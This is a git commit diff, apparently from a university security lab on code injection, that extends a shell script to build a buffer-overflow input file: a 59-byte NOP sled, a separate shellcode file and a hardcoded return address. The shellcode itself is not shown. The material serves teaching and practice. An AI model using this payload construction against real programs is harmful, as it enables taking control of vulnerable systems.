248fc656226b8f66b4317d7e4c7d7ab54c7be6c6
xn4224nx <benjamin.dafydd.mouncer@gmail.com>
2023-09-17 01:10:10 +0100

    Added injection vector creation.

--- 02_7CCSONSE/2_4_Code_Injection/01_run_injection_attack.sh
+++ 02_7CCSONSE/2_4_Code_Injection/01_run_injection_attack.sh
@@ -5,6 +5,16 @@ echo -e "\nFile permissions of the files in the folder:\n"
 ls -l
 
 # Dissamble the binary file into assembly
-echo -e "\nAssemby breakdown of './00_shellcode' printed to file."
 ndisasm -b 32 ./00_shellcode &> 02_shellcode.asm
+
+# Show the NOP command
+echo -e "\nNOP Command:"
+perl -e 'print "\x90"' | ndisasm -b 32 -
+
+# Create the exploitation file '03_iv'
+{
+    perl -e 'print "\x90"x59'           # NOP slead (59 bytes)
+    cat 00_shellcode                    # Shellcode (45 bytes)
+    perl -e 'print "\xca\xf8\xff\xbf"'  # Shellcode address (4 byte)
+} > 03_iv
 
